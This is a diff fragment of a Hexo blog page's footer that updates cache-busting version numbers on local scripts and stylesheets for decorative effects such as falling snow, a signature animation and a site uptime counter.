 <!-- 全屏背景 -->
-<script src="/js/background.js?v=1776052314288"></script>
+<script src="/js/background.js?v=1776091024127"></script>
 
 <!-- 落雪动画 -->
-<script src="/js/snow.js?v=1776052314288"></script>
+<script src="/js/snow.js?v=1776091024127"></script>
 
 <!-- 签名动画 -->
-<script src="/js/sign.js?v=1776052314288"></script>
-<link rel="stylesheet" href="/css/sign.css?v=1776052314288">
+<script src="/js/sign.js?v=1776091024127"></script>
+<link rel="stylesheet" href="/css/sign.css?v=1776091024127">
 
 <!-- 标签页标题变化 -->
-<script src="/js/title.js?v=1776052314288"></script>
+<script src="/js/title.js?v=1776091024127"></script>
 
 <!-- 文章卡片滑入动画 -->
-<script src="/js/scrollAnimation.js?v=1776052314288"></script>
-<link rel="stylesheet" href="/css/scrollAnimation.css?v=1776052314288">
+<script src="/js/scrollAnimation.js?v=1776091024127"></script>
+<link rel="stylesheet" href="/css/scrollAnimation.css?v=1776091024127">
 
 <!-- 网站运行时间 -->
-<script src="/js/time-insert.js?v=1776052314288"></script>
+<script src="/js/time-insert.js?v=1776091024127"></script>
   <!-- hexo injector body_end end --></body>
 </html>
